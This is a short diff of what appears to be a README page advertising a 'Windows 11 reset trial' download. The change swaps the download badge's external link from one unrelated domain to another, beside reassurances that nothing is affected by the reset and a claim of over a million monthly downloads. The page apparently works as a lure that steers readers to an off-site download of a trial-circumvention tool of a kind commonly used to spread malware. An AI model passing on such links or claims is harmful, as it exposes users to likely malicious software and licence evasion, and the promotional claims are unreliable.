@@ -49,7 +49,7 @@ A: No — no files or settings are affected by reset.
 
 **Monthly downloads:** 1.1m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/win11resettrial)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/win11resettrial)
 
 ---
 
